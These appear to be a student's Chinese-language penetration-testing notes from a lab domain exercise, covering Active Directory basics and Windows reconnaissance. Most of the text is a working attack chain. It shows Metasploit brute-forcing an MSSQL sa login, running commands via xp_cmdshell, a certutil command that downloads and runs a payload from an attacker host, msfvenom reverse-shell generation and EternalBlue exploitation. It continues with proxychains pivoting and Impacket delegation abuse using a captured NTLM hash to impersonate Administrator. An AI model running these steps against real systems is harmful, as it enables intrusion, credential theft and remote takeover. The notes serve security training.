渗透记录

内外网怎么联通

内网提供服务，由防火墙/路由器做端口映射，外网往往只能扫到80/443这种端口

域和工作组  区别

域控    不同域不能互相访问，除非建立信任关系

父域（eg：abc.com）和子域(eg:asia.abc.com)形成域树网路    ------域树连在一起成域林

父子默认信任关系，存在信任传递关系

内网会放一台dns，一般内网渗透，就是寻找dns服务器来定位dc（dns服务器和dc通常会处在同一台机器上）



域中计算机

域本地组/全局组/通用组

AGDLP策略



域环境搭建

1、设置静态IP（自己的域控）

2、dcpromo      C：/NTDS

创建域用户    net user xy 123.com/add          可在计算机里面加入域

dns要改成自己提供的        

3、给相应用户下发组策略      通过策略进行操控

gpupdate /force    强制刷新策略



子域   在现有林

副域控   建立冗余

域林互信：需要添加转发器



分析内网网络拓扑



uac提权

ncpa.cpl

如何查找内网网段：

1.工具扫网段（192.168.0.xx->1.0->2.0等等）

推荐s.exe   syn  192.168.0.0    192.168.255.255    445

2.文件共享链接记录

\\\\1        mstsc 3389

3、抓包分析网络流量（kali   msf    msterpreter）

4、爆破路由器



看进程

tasklist 

查询端口列表

netstat -ano  

systeminfo

net share    查看共享文件夹

at 查看计划任务

查看用户列表

net localgroup administrators

查看在线用户

query user

 arp -a   主机在内网通信的话有一个请求访问，进行一个广播

内网走mac地址  （有arp攻击，缓冲表欺骗）

netsh 可做端口转发，我们可以达到访问内网端口的目的

不要把自己的盘挂载到别人服务器上

empire 的arpscan模块

nbtscan

```
whoami
whoami/all 获取SID
net user xxx/domain
net user /domain
ipconfig/all
systeminfo
net config workstation
net time/domain 判断主域控

mstsc
query user
test /domain_trusts
net account /domain

powershell.exe -exec bypass 
powersploit    无文件攻击   需要搭载一个vps进行调用

msf使用
load powershell
powershell_import
powershell_
powershell_exectue getNetDomain

服务
爆破
漏洞  smb
欺骗
钓鱼

抓http/https
1、强制转换使用http协议
2、
```



hashdump？？？





### 使用xp_cmdshell进行提权

> xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后默认禁止，但未删除

0x01 xp_cmdshell简介

`xp``_cmdshell`是`Sql Server`中的一个组件，将命令字符串作为操作系统命令 shell 执行，并以文本行的形式返回所有输出。通常在拿到sa口令之后，可以通过`xp``_cmdshell`来进行提权

**影响范围：**

只要该数据库存在该组件，就可以利用

0x02 xp_cmdshell使用



kali重启网卡命令dhclient -v

Metasploit基本渗透框架



```
msf6 > db_nmap -sU -sV -p 1433 192.168.194.137
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 13:30 CST
[*] Nmap: Nmap scan report for 192.168.194.137
[*] Nmap: Host is up (0.00053s latency).
[*] Nmap: PORT     STATE         SERVICE  VERSION
[*] Nmap: 1433/udp open|filtered ms-sql-s
[*] Nmap: MAC Address: 00:0C:29:03:3B:F9 (VMware)
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 99.65 seconds
msf6 > db_nmap -sU --script=ms-sql-info -p 1433 192.168.194.137
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 13:33 CST
[*] Nmap: Nmap scan report for 192.168.194.137
[*] Nmap: Host is up (0.00094s latency).
[*] Nmap: PORT     STATE         SERVICE
[*] Nmap: 1433/udp open|filtered ms-sql-s
[*] Nmap: MAC Address: 00:0C:29:03:3B:F9 (VMware)
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 5.87 seconds
msf6 > use auxiliary/scanner/mssql/mssql_login 
msf6 auxiliary(scanner/mssql/mssql_login) > show options

Module options (auxiliary/scanner/mssql/mssql_login):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   ANONYMOUS_LOGIN      false            yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS      true             no        Try blank passwords for all users
   BRUTEFORCE_SPEED     5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS         false            no        Try each user/password couple stored in the current d
                                                   atabase
   DB_ALL_PASS          false            no        Add all passwords in the current database to the list
   DB_ALL_USERS         false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING     none             no        Skip existing credentials stored in the current datab
                                                   ase (Accepted: none, user, user&realm)
   PASSWORD                              no        A specific password to authenticate with
   PASS_FILE                             no        File containing passwords, one per line
   RHOSTS                                yes       The target host(s), see https://docs.metasploit.com/d
                                                   ocs/using-metasploit/basics/using-metasploit.html
   RPORT                1433             yes       The target port (TCP)
   STOP_ON_SUCCESS      false            yes       Stop guessing when a credential works for a host
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   THREADS              1                yes       The number of concurrent threads (max one per host)
   USERNAME             sa               no        A specific username to authenticate as
   USERPASS_FILE                         no        File containing users and passwords separated by spac
                                                   e, one pair per line
   USER_AS_PASS         false            no        Try the username as the password for all users
   USER_FILE                             no        File containing usernames, one per line
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentication (requires DOMAIN option se
                                                   t)
   VERBOSE              true             yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/mssql/mssql_login) > set rhosts 192.168.194.137
rhosts => 192.168.194.137
msf6 auxiliary(scanner/mssql/mssql_login) > set username sa
username => sa
msf6 auxiliary(scanner/mssql/mssql_login) > set password 123456
password => 123456
msf6 auxiliary(scanner/mssql/mssql_login) > set threads 10
threads => 10
msf6 auxiliary(scanner/mssql/mssql_login) > run

[*] 192.168.194.137:1433  - 192.168.194.137:1433 - MSSQL - Starting authentication scanner.
[+] 192.168.194.137:1433  - 192.168.194.137:1433 - Login Successful: WORKSTATION\sa:123456
[*] 192.168.194.137:1433  - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/mssql/mssql_login) > use auxiliary/scanner/mssql/mssql_hashdump 
msf6 auxiliary(scanner/mssql/mssql_hashdump) > show options

Module options (auxiliary/scanner/mssql/mssql_hashdump):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   PASSWORD                              no        The password for the specified username
   RHOSTS                                yes       The target host(s), see https://docs.metasploit.com/d
                                                   ocs/using-metasploit/basics/using-metasploit.html
   RPORT                1433             yes       The target port (TCP)
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   THREADS              1                yes       The number of concurrent threads (max one per host)
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentication (requires DOMAIN option se
                                                   t)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/mssql/mssql_hashdump) > set rhosts 192.168.194.137
rhosts => 192.168.194.137
msf6 auxiliary(scanner/mssql/mssql_hashdump) > set password 123456
password => 123456
msf6 auxiliary(scanner/mssql/mssql_hashdump) > set threads 10
threads => 10
msf6 auxiliary(scanner/mssql/mssql_hashdump) > run

[*] 192.168.194.137:1433  - Instance Name: nil
[*] 192.168.194.137:1433  - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/mssql/mssql_hashdump) > use auxiliary/admin/mssql/mssql_enum
msf6 auxiliary(admin/mssql/mssql_enum) > show options

Module options (auxiliary/admin/mssql/mssql_enum):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   PASSWORD                              no        The password for the specified username
   RHOSTS                                yes       The target host(s), see https://docs.metasploit.com/d
                                                   ocs/using-metasploit/basics/using-metasploit.html
   RPORT                1433             yes       The target port (TCP)
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentication (requires DOMAIN option se
                                                   t)


View the full module info with the info, or info -d command.

msf6 auxiliary(admin/mssql/mssql_enum) > set password 123456
password => 123456
msf6 auxiliary(admin/mssql/mssql_enum) > set rhosts 192.168.194.137
rhosts => 192.168.194.137
msf6 auxiliary(admin/mssql/mssql_enum) > run
[*] Running module against 192.168.194.137

[*] 192.168.194.137:1433 - Running MS SQL Server Enumeration...
[*] 192.168.194.137:1433 - Version:
[*]     Microsoft SQL Server 2016 (SP1) (KB3182545) - 13.0.4001.0 (X64) 
[*]             Oct 28 2016 18:17:30 
[*]             Copyright (c) Microsoft Corporation
[*]             Enterprise Edition (64-bit) on Windows Server 2019 Datacenter 6.3 <X64> (Build 17763: ) (Hypervisor)
[*] 192.168.194.137:1433 - Configuration Parameters:
[*] 192.168.194.137:1433 -      C2 Audit Mode is Not Enabled
[*] 192.168.194.137:1433 -      xp_cmdshell is Enabled
[*] 192.168.194.137:1433 -      remote access is Enabled
[*] 192.168.194.137:1433 -      allow updates is Not Enabled
[*] 192.168.194.137:1433 -      Database Mail XPs is Not Enabled
[*] 192.168.194.137:1433 -      Ole Automation Procedures are Not Enabled
[*] 192.168.194.137:1433 - Databases on the server:
[*] 192.168.194.137:1433 -      Database name:master
[*] 192.168.194.137:1433 -      Database Files for master:
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\master.mdf
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\mastlog.ldf
[*] 192.168.194.137:1433 -      Database name:tempdb
[*] 192.168.194.137:1433 -      Database Files for tempdb:
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\tempdb.mdf
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\templog.ldf
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\tempdb_mssql_2.ndf
[*] 192.168.194.137:1433 -      Database name:model
[*] 192.168.194.137:1433 -      Database Files for model:
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\model.mdf
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\modellog.ldf
[*] 192.168.194.137:1433 -      Database name:msdb
[*] 192.168.194.137:1433 -      Database Files for msdb:
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\MSDBData.mdf
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\MSDBLog.ldf
[*] 192.168.194.137:1433 -      Database name:ReportServer
[*] 192.168.194.137:1433 -      Database Files for ReportServer:
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\ReportServer.mdf
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\ReportServer_log.ldf
[*] 192.168.194.137:1433 -      Database name:ReportServerTempDB
[*] 192.168.194.137:1433 -      Database Files for ReportServerTempDB:
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\ReportServerTempDB.mdf
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\ReportServerTempDB_log.ldf
[*] 192.168.194.137:1433 -      Database name:DWDiagnostics
[*] 192.168.194.137:1433 -      Database Files for DWDiagnostics:
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\DWDiagnostics.mdf
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\DWDiagnostics_log.ldf
[*] 192.168.194.137:1433 -      Database name:DWConfiguration
[*] 192.168.194.137:1433 -      Database Files for DWConfiguration:
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\DWConfiguration.mdf
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\DWConfiguration_log.ldf
[*] 192.168.194.137:1433 -      Database name:DWQueue
[*] 192.168.194.137:1433 -      Database Files for DWQueue:
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\DWQueue.mdf
[*] 192.168.194.137:1433 -              C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\DATA\DWQueue_log.ldf
[*] 192.168.194.137:1433 - System Logins on this Server:
[*] 192.168.194.137:1433 -      sa
[*] 192.168.194.137:1433 -      ##MS_SQLResourceSigningCertificate##
[*] 192.168.194.137:1433 -      ##MS_SQLReplicationSigningCertificate##
[*] 192.168.194.137:1433 -      ##MS_SQLAuthenticatorCertificate##
[*] 192.168.194.137:1433 -      ##MS_PolicySigningCertificate##
[*] 192.168.194.137:1433 -      ##MS_SmoExtendedSigningCertificate##
[*] 192.168.194.137:1433 -      ##MS_PolicyTsqlExecutionLogin##
[*] 192.168.194.137:1433 -      WIN-IISSERVER\Administrator
[*] 192.168.194.137:1433 -      NT SERVICE\SQLWriter
[*] 192.168.194.137:1433 -      NT SERVICE\Winmgmt
[*] 192.168.194.137:1433 -      NT Service\MSSQLSERVER
[*] 192.168.194.137:1433 -      NT AUTHORITY\SYSTEM
[*] 192.168.194.137:1433 -      NT SERVICE\SQLSERVERAGENT
[*] 192.168.194.137:1433 -      NT SERVICE\ReportServer
[*] 192.168.194.137:1433 -      NT AUTHORITY\NETWORK SERVICE
[*] 192.168.194.137:1433 -      l_certSignSmDetach
[*] 192.168.194.137:1433 -      NT SERVICE\SQLTELEMETRY
[*] 192.168.194.137:1433 -      ##MS_PolicyEventProcessingLogin##
[*] 192.168.194.137:1433 -      ##MS_AgentSigningCertificate##
[*] 192.168.194.137:1433 - Disabled Accounts:
[*] 192.168.194.137:1433 -      ##MS_PolicyTsqlExecutionLogin##
[*] 192.168.194.137:1433 -      ##MS_PolicyEventProcessingLogin##
[*] 192.168.194.137:1433 - No Accounts Policy is set for:
[*] 192.168.194.137:1433 -      sa
[*] 192.168.194.137:1433 - Password Expiration is not checked for:
[*] 192.168.194.137:1433 -      sa
[*] 192.168.194.137:1433 -      ##MS_PolicyTsqlExecutionLogin##
[*] 192.168.194.137:1433 -      ##MS_PolicyEventProcessingLogin##
[*] 192.168.194.137:1433 - System Admin Logins on this Server:
[*] 192.168.194.137:1433 -      sa
[*] 192.168.194.137:1433 -      WIN-IISSERVER\Administrator
[*] 192.168.194.137:1433 -      NT SERVICE\SQLWriter
[*] 192.168.194.137:1433 -      NT SERVICE\Winmgmt
[*] 192.168.194.137:1433 -      NT Service\MSSQLSERVER
[*] 192.168.194.137:1433 -      NT SERVICE\SQLSERVERAGENT
[*] 192.168.194.137:1433 -      l_certSignSmDetach
[*] 192.168.194.137:1433 - Windows Logins on this Server:
[*] 192.168.194.137:1433 -      WIN-IISSERVER\Administrator
[*] 192.168.194.137:1433 -      NT SERVICE\SQLWriter
[*] 192.168.194.137:1433 -      NT SERVICE\Winmgmt
[*] 192.168.194.137:1433 -      NT Service\MSSQLSERVER
[*] 192.168.194.137:1433 -      NT AUTHORITY\SYSTEM
[*] 192.168.194.137:1433 -      NT SERVICE\SQLSERVERAGENT
[*] 192.168.194.137:1433 -      NT SERVICE\ReportServer
[*] 192.168.194.137:1433 -      NT AUTHORITY\NETWORK SERVICE
[*] 192.168.194.137:1433 -      NT SERVICE\SQLTELEMETRY
[*] 192.168.194.137:1433 - Windows Groups that can logins on this Server:
[*] 192.168.194.137:1433 -      No Windows Groups where found with permission to login to system.
[*] 192.168.194.137:1433 - Accounts with Username and Password being the same:
[*] 192.168.194.137:1433 -      No Account with its password being the same as its username was found.
[*] 192.168.194.137:1433 - Accounts with empty password:
[*] 192.168.194.137:1433 -      No Accounts with empty passwords where found.
[*] 192.168.194.137:1433 - Stored Procedures with Public Execute Permission found:
[*] 192.168.194.137:1433 -      sp_replsetsyncstatus
[*] 192.168.194.137:1433 -      sp_replcounters
[*] 192.168.194.137:1433 -      sp_replsendtoqueue
[*] 192.168.194.137:1433 -      sp_resyncexecutesql
[*] 192.168.194.137:1433 -      sp_prepexecrpc
[*] 192.168.194.137:1433 -      sp_repltrans
[*] 192.168.194.137:1433 -      sp_xml_preparedocument
[*] 192.168.194.137:1433 -      xp_qv
[*] 192.168.194.137:1433 -      xp_getnetname
[*] 192.168.194.137:1433 -      sp_releaseschemalock
[*] 192.168.194.137:1433 -      sp_refreshview
[*] 192.168.194.137:1433 -      sp_replcmds
[*] 192.168.194.137:1433 -      sp_unprepare
[*] 192.168.194.137:1433 -      sp_resyncprepare
[*] 192.168.194.137:1433 -      sp_createorphan
[*] 192.168.194.137:1433 -      xp_dirtree
[*] 192.168.194.137:1433 -      sp_replwritetovarbin
[*] 192.168.194.137:1433 -      sp_replsetoriginator
[*] 192.168.194.137:1433 -      sp_xml_removedocument
[*] 192.168.194.137:1433 -      sp_repldone
[*] 192.168.194.137:1433 -      sp_reset_connection
[*] 192.168.194.137:1433 -      xp_fileexist
[*] 192.168.194.137:1433 -      xp_fixeddrives
[*] 192.168.194.137:1433 -      sp_getschemalock
[*] 192.168.194.137:1433 -      sp_prepexec
[*] 192.168.194.137:1433 -      xp_revokelogin
[*] 192.168.194.137:1433 -      sp_execute_external_script
[*] 192.168.194.137:1433 -      sp_resyncuniquetable
[*] 192.168.194.137:1433 -      sp_replflush
[*] 192.168.194.137:1433 -      sp_resyncexecute
[*] 192.168.194.137:1433 -      xp_grantlogin
[*] 192.168.194.137:1433 -      sp_droporphans
[*] 192.168.194.137:1433 -      xp_regread
[*] 192.168.194.137:1433 -      sp_getbindtoken
[*] 192.168.194.137:1433 -      sp_replincrementlsn
[*] 192.168.194.137:1433 - Instances found on this server:
[*] 192.168.194.137:1433 -      MSSQLSERVER
[*] 192.168.194.137:1433 - Default Server Instance SQL Server Service is running under the privilege of:
[*] 192.168.194.137:1433 -      NT Service\MSSQLSERVER
[*] Auxiliary module execution completed
msf6 auxiliary(admin/mssql/mssql_enum) > use auxiliary/admin/mssql/mssql_exec
msf6 auxiliary(admin/mssql/mssql_exec) > show options                                                                                                    
                                                                                                                                                         
Module options (auxiliary/admin/mssql/mssql_exec):                                                                                                       
                                                                                                                                                         
   Name                 Current Setting                       Required  Description                                                                      
   ----                 ---------------                       --------  -----------
   CMD                  cmd.exe /c echo OWNED > C:\owned.exe  no        Command to execute
   PASSWORD                                                   no        The password for the specified username
   RHOSTS                                                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
                                                                        s/using-metasploit.html
   RPORT                1433                                  yes       The target port (TCP)
   TDSENCRYPTION        false                                 yes       Use TLS/SSL for TDS data "Force Encryption"
   TECHNIQUE            xp_cmdshell                           yes       Technique to use for command execution (Accepted: xp_cmdshell, sp_oacreate)
   USERNAME             sa                                    no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false                                 yes       Use windows authentication (requires DOMAIN option set)


View the full module info with the info, or info -d command.

msf6 auxiliary(admin/mssql/mssql_exec) > set rhosts 192.168.194.137
rhosts => 192.168.194.137
msf6 auxiliary(admin/mssql/mssql_exec) > set password 123456
password => 123456
msf6 auxiliary(admin/mssql/mssql_exec) > set cmd 'ipconfig'
cmd => ipconfig
msf6 auxiliary(admin/mssql/mssql_exec) > run
[*] Running module against 192.168.194.137

[*] 192.168.194.137:1433 - SQL Query: EXEC master..xp_cmdshell 'ipconfig'



 output
 ------
 Windows IP M�n
 �N*YQ�M�hV Ethernet0:
 ���cyr�[�v DNS T . . . . . . . : localdomain
 ,g0W���c IPv6 0W@W. . . . . . . . : fe80::4164:1c45:67cc:f618%13
 IPv4 0W@W . . . . . . . . . . . . : 192.168.194.137
 P[Q�cx  . . . . . . . . . . . . : 255.255.255.0
 ����QsQ. . . . . . . . . . . . . : 192.168.194.2
 �N*YQ�M�hV Ethernet1:
 ���cyr�[�v DNS T . . . . . . . :
 ,g0W���c IPv6 0W@W. . . . . . . . : fe80::7c7d:6a20:cf11:8576%8
 IPv4 0W@W . . . . . . . . . . . . : 172.22.10.22
 P[Q�cx  . . . . . . . . . . . . : 255.255.255.0
 ����QsQ. . . . . . . . . . . . . : 172.22.10.1

[*] Auxiliary module execution completed
msf6 auxiliary(admin/mssql/mssql_exec) > 

```



（Cobalt Strike）cs提权

```
增加执行权限
chmod +x agscript
chmod +x teamserver

这俩加不起不知道
chmod +x c2lint
chmod +x peclone
```





msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.194.129 lport=81 -f exe -o /var/www/html/shell.exe

*# lhost 是kali的ip* *# lport 是kali监听端口*

```
/* 判断当前是否为 DBA 权限，返回 1 则可以提权 */
SELECT IS_SRVROLEMEMBER('sysadmin');

/* 查看是否存在 xp_cmdshell，返回 1 则存在 */
SELECT COUNT(*) FROM master.dbo.sysobjects WHERE xtype='x' AND name='xp_cmdshell'

/* 开启 xp_cmdshell */
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;

/* 执行系统命令 */
EXEC master.dbo.xp_cmdshell 'cd C:\Users\Public & certutil -urlcache -split -f http://192.168.162.130:8080/she1l.exe';

EXEC master.dbo.xp_cmdshell 'C:\Users\Public\she1l.exe'
```





```
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 192.168.194.129   # msf所在主机的ip
set lport 99     # msf所在主机自定义端口号
run
```

```
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp
set rhosts 172.22.10.36
set lport 4444
run
```

```
添加路由 
run autoroute -s 172.22.10.0/24
background

run post/windows/gather/arp-scanner RHOST=172.22.10.0/24
```

![image-20241201233846205](C:\Users\Annie\AppData\Roaming\Typora\typora-user-images\image-20241201233846205.png)

![image-20241201233940752](C:\Users\Annie\AppData\Roaming\Typora\typora-user-images\image-20241201233940752.png)

![image-20241201234134600](C:\Users\Annie\AppData\Roaming\Typora\typora-user-images\image-20241201234134600.png)

route add 172.22.10.0 255.255.255.0 1

route print



路由设置(拿到web01的meterpreter之后设置)

```
run post/multi/manage/autoroute
run autoroute -p
background
use auxiliary/server/socks_proxy
search autoroute
use 0
options
set session 1
exploit
到这里msf就能利用了已经

设置socket代理
background
search socks
use 0
options
run
 vi /etc/proxychains4.conf   （用的那个就只开哪个端口的socket）
```

WIN-PC8086 这台域成员机器存在 MS17_010 漏洞，ip为 172.22.10.36，使用 msf 挂上代理，用 bind_tcp 类型的 payload 直接打：

```
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp
set rhosts 172.22.10.36
set lport 4444
run
```

成功获取 SYSTEM 权限：



枚举域内委派关系

```
proxychains4 python3 findDelegation.py aerospace.local/WIN-PC8086\$ -hashes :680f2285800a0da67b4d6aa443ed0ab2 -dc-ip 172.22.10.11
```

```
proxychains4 python3 getST.py aerospace.local/WIN-PC8086\$ -hashes :680f2285800a0da67b4d6aa443ed0ab2 -spn CIFS/WIN-PC8098.aerospace.local -impersonate Administrator -dc-ip 172.22.10.11

Saving ticket in Administrator@CIFS_WIN-PC8098.aerospace.local@AEROSPACE.LOCAL.ccache


```



![image-20241203162837820](C:\Users\Annie\AppData\Roaming\Typora\typora-user-images\image-20241203162837820.png)

680f2285800a0da67b4d6aa443ed0ab2

proxychains4 curl http://172.22.10.22

